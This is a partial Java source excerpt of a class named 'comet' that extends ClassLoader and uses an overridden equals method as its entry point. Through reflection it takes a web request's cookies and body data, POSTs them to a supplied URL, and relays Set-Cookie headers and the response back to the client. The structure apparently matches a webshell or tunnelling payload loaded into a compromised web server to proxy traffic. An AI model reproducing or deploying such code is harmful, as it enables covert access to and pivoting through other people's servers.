...
public class comet extends ClassLoader
{
    ...
    private byte[] http_post(String szUrl, String szData, Object objResponse, String cookieHeader) throws Exception {
        byte[] postBytes = szData != null ? szData.getBytes(StandardCharsets.UTF_8) : new byte[0];
        return http_post_raw(szUrl, postBytes, "application/x-www-form-urlencoded", objResponse, cookieHeader);
    }

    private byte[] http_post(String szUrl, byte[] abData, Object objResponse, String cookieHeader) throws Exception {
        return http_post_raw(szUrl, abData, "application/octet-stream", objResponse, cookieHeader);
    }

    private byte[] http_post_raw(String szUrl, byte[] postBytes, String contentType, Object objResponse, String cookieHeader) throws Exception {
        ...
        try {
            ...
            if (headerFields != null && objResponse != null) {
                List<String> setCookieList = headerFields.get("Set-Cookie");
                if (setCookieList != null) {
                    Method fnAddHeader = objResponse.getClass().getMethod("addHeader", String.class, String.class);
                    for (String cookieVal : setCookieList) {
                        fnAddHeader.invoke(objResponse, "Set-Cookie", cookieVal);
                    }
                }
            }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            Method fnGetHeader = objRequest.getClass().getMethod("getHeader", String.class);
            String cookieHeader = (String) fnGetHeader.invoke(objRequest, "Cookie");

            byte[] responseBytes;
            if (bIsBinary)
            {
                responseBytes = http_post(szURL, decodedData, objResponse, cookieHeader);
            }
            else
            {
                String szTextPayload = new String(decodedData, StandardCharsets.UTF_8);
                responseBytes = http_post(szURL, szTextPayload, objResponse, cookieHeader);
            }
            ...
            fnWriteOutput(objParam, objResponse, osClient, finalOutputBytes);
        }
        catch (Exception ex)
        {
            if (osClient != null)
